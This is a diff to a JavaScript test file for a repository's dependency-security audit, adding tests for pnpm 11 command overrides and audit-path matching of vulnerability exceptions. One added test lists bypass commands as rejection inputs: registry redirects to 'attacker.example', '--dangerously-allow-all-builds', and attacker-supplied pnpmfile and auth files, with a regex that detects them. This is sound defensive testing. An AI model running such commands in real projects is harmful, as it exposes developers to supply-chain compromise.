@@ -2632,6 +2632,87 @@ test('executable dependency command audit rejects runner resolution overrides', 
   assert.deepEqual(forwarded, { commandCount: 8, errors: [] })
 })
 
+// pnpm 11 reads pnpm_config_* (and PNPM_CONFIG_*) and ignores npm_config_*,
+// so its settings can be changed from the environment or the command line
+// without touching the reviewed pnpm-workspace.yaml.
+test('executable dependency command audit rejects pnpm 11 configuration overrides', () => {
+  const bypasses = [
+    {
+      file: 'package.json',
+      command: 'pnpm_config_registry=https://attacker.example/ pnpm dlx tool@1.2.3',
+    },
+    {
+      file: 'package.json',
+      command: 'PNPM_CONFIG_REGISTRY=https://attacker.example/ pnpm install --frozen-lockfile',
+    },
+    {
+      file: '.github/workflows/registry.yml',
+      command:
+        'jobs:\n  build:\n    env:\n      pnpm_config_registry: https://attacker.example/\n    steps:\n      - run: corepack pnpm install --frozen-lockfile',
+    },
+    {
+      file: '.github/workflows/builds.yml',
+      command:
+        "steps:\n  - run: corepack pnpm install --frozen-lockfile\n    env:\n      pnpm_config_dangerously_allow_all_builds: 'true'",
+    },
+    { file: 'package.json', command: 'pnpm install --dangerously-allow-all-builds' },
+    {
+      file: 'package.json',
+      command: 'corepack pnpm install --frozen-lockfile --dangerously-allow-all-builds=true',
+    },
+    { file: 'package.json', command: 'pnpm add --allow-build=esbuild esbuild@0.25.12' },
+    { file: 'package.json', command: 'corepack pnpm install --allow-build=esbuild' },
+    { file: 'package.json', command: 'pnpm dlx --dangerously-allow-all-builds tool@1.2.3' },
+    {
+      file: '.github/workflows/linker.yml',
+      command:
+        'jobs:\n  build:\n    env:\n      pnpm_config_node_linker: isolated\n    steps:\n      - run: corepack pnpm install --frozen-lockfile',
+    },
+    { file: 'package.json', command: 'pnpm install --config.node-linker=isolated' },
+    { file: 'package.json', command: 'pnpm --config.node-linker isolated install' },
+    { file: 'package.json', command: 'pnpm install --node-linker=isolated' },
+    { file: 'package.json', command: 'pnpm_config_npmrc_auth_file=./attacker.ini pnpm install' },
+    { file: 'package.json', command: 'pnpm install --npmrc-auth-file ./attacker.ini' },
+    { file: 'package.json', command: 'pnpm install --pnpmfile=./attacker.mjs' },
+    {
+      file: 'package.json',
+      command: 'pnpx --config.registry=https://attacker.example/ tool@1.2.3',
+    },
+    {
+      file: 'scripts/build.mjs',
+      command: 'PNPM_CONFIG_DANGEROUSLY_ALLOW_ALL_BUILDS=true corepack pnpm run build',
+    },
+  ]
+  for (const { file, command } of bypasses) {
+    const { errors } = auditExecutableDependencyCommands([{ file, commands: [command] }])
+    assert.ok(
+      errors.some(error =>
+        /: (?:pnpm_config_|PNPM_CONFIG_|--dangerously-allow-all-builds|--allow-build|--config\.|--node-linker|--npmrc-auth-file|--pnpmfile)/.test(
+          error
+        )
+      ),
+      `${file}: ${command} must be rejected for its pnpm setting, got ${JSON.stringify(errors)}`
+    )
+  }
+
+  // npm keeps its own npm_config_* settings, and pnpm options after `--`
+  // belong to the script or tool pnpm runs.
+  const accepted = auditExecutableDependencyCommands([
+    {
+      file: 'package.json',
+      commands: [
+        'corepack pnpm install --frozen-lockfile',
+        'corepack pnpm install --frozen-lockfile --ignore-scripts',
+        'corepack pnpm -r test -- --maxWorkers=2',
+        'corepack pnpm exec playwright test -- --config.workers=1',
+        // A runner may approve the build of the exact package it fetches.
+        'pnpm dlx --allow-build=tool tool@1.2.3',
+      ],
+    },
+  ])
+  assert.deepEqual(accepted, { commandCount: 5, errors: [] })
+})
+
 test('executable dependency command audit covers pinned pnpm create normalization', () => {
   const rejected = auditExecutableDependencyCommands([
     {
@@ -3002,6 +3083,18 @@ test('lockfile license baseline onboarding records new identities as pending rev
 
 const CSS_MODULE_REFERENCE = ['typed-css', 'modules'].join('-')
 const CSS_LOADER_REFERENCE = ['typed-css', 'modules-loader'].join('-')
+// pnpm 11 writes audit paths as `<importer>>name>name`, with the importer's
+// slashes replaced by `__` and no versions.
+const AUDIT_PATH = `apps__extension>${CSS_LOADER_REFERENCE}>${CSS_MODULE_REFERENCE}>postcss`
+const LOCKFILE_SOURCE = `lockfileVersion: '9.0'
+importers:
+  .: {}
+  apps/extension:
+    devDependencies:
+      ${CSS_LOADER_REFERENCE}:
+        specifier: ^0.0.18
+        version: 0.0.18
+`
 
 function vulnerabilityFixture() {
   return {
@@ -3017,9 +3110,7 @@ function vulnerabilityFixture() {
         findings: [
           {
             version: '7.0.0',
-            paths: [
-              `apps/extension > ${CSS_LOADER_REFERENCE}@0.0.18 > ${CSS_MODULE_REFERENCE}@0.6.8 > postcss@7.0.0`,
-            ],
+            paths: [AUDIT_PATH],
           },
         ],
       },
@@ -3036,9 +3127,7 @@ function exceptionFixture() {
         package: 'postcss',
         severity: 'high',
         versions: ['7.0.0'],
-        paths: [
-          `apps/extension > ${CSS_LOADER_REFERENCE}@0.0.18 > ${CSS_MODULE_REFERENCE}@0.6.8 > postcss@7.0.0`,
-        ],
+        paths: [AUDIT_PATH],
         reachability: 'demonstrably-unreachable',
         reachabilityGuard: {
           type: 'tracked-source-absence',
@@ -3073,6 +3162,9 @@ function trackedSourceContextFixture(extraFiles = [], manifestOverrides = {}) {
         }),
       },
       { file: 'webpack.config.cjs', source: 'module.exports = {}' },
+      // The guard reads exception paths against the lockfile's importers, and
+      // a reference inside the lockfile is provenance, not activation.
+      { file: 'pnpm-lock.yaml', source: LOCKFILE_SOURCE },
       ...extraFiles,
     ],
   }
@@ -3114,7 +3206,6 @@ test('vulnerability audit rejects a tracking issue outside Qbit-Org/qbit-wallet'
 test('vulnerability audit ignores only fixed non-executable reference provenance', () => {
   const context = trackedSourceContextFixture([
     { file: 'docs/dependency-note.md', source: CSS_LOADER_REFERENCE },
-    { file: 'pnpm-lock.yaml', source: CSS_LOADER_REFERENCE },
     {
       file: 'scripts/security/dependency-license-baseline.json',
       source: CSS_MODULE_REFERENCE,
@@ -3225,6 +3316,61 @@ test('vulnerability audit fails closed on missing, malformed, or stale reachabil
   assert.match(missingContextAudit.errors.join('\n'), /requires a non-empty tracked-source context/)
 })
 
+test('vulnerability audit matches exceptions against pnpm 11 audit paths', () => {
+  const now = new Date('2026-07-31T12:00:00.000Z')
+  assert.deepEqual(
+    auditVulnerabilityReport(
+      vulnerabilityFixture(),
+      exceptionFixture(),
+      now,
+      trackedSourceContextFixture()
+    ),
+    { errors: [], acceptedCount: 1, blockingCount: 1 }
+  )
+
+  // A new path in the live audit makes the accepted exception stale.
+  const widened = vulnerabilityFixture()
+  widened.advisories[1].findings[0].paths.push(
+    `apps__extension>webpack>${CSS_MODULE_REFERENCE}>postcss`
+  )
+  const widenedAudit = auditVulnerabilityReport(
+    widened,
+    exceptionFixture(),
+    now,
+    trackedSourceContextFixture()
+  )
+  assert.equal(widenedAudit.acceptedCount, 0)
+  assert.match(widenedAudit.errors.join('\n'), /versions, or paths changed/)
+
+  // A path still written in pnpm 8's form names no importer and fails closed,
+  // even where the live audit repeats it verbatim.
+  const pnpm8Path = `apps/extension > ${CSS_LOADER_REFERENCE}@0.0.18 > ${CSS_MODULE_REFERENCE}@0.6.8 > postcss@7.0.0`
+  const pnpm8Report = vulnerabilityFixture()
+  pnpm8Report.advisories[1].findings[0].paths = [pnpm8Path]
+  const pnpm8Exception = exceptionFixture()
+  pnpm8Exception.exceptions[0].paths = [pnpm8Path]
+  const pnpm8Audit = auditVulnerabilityReport(
+    pnpm8Report,
+    pnpm8Exception,
+    now,
+    trackedSourceContextFixture()
+  )
+  assert.equal(pnpm8Audit.acceptedCount, 0)
+  assert.match(pnpm8Audit.errors.join('\n'), /does not start with a pnpm-lock\.yaml importer/)
+
+  // Without the lockfile's importers the guard cannot read the paths.
+  const noLockfile = trackedSourceContextFixture()
+  noLockfile.files = noLockfile.files.filter(record => record.file !== 'pnpm-lock.yaml')
+  const noLockfileAudit = auditVulnerabilityReport(
+    vulnerabilityFixture(),
+    exceptionFixture(),
+    now,
+    noLockfile
+  )
+  assert.equal(noLockfileAudit.acceptedCount, 0)
+  assert.match(noLockfileAudit.errors.join('\n'), /has no pnpm-lock\.yaml importers/)
+})
+
 test('vulnerability audit rejects unaccepted, changed, expired, and stale exceptions', () => {
   const now = new Date('2026-07-31T12:00:00.000Z')
   const unaccepted = auditVulnerabilityReport(
@@ -3235,7 +3381,7 @@ test('vulnerability audit rejects unaccepted, changed, expired, and stale except
   assert.match(unaccepted.errors.join('\n'), /unaccepted high advisory/)
 
   const changed = exceptionFixture()
-  changed.exceptions[0].paths = ['app > newly-reachable > postcss@7.0.0']
+  changed.exceptions[0].paths = ['apps__extension>newly-reachable>postcss']
   assert.match(
     auditVulnerabilityReport(
       vulnerabilityFixture(),
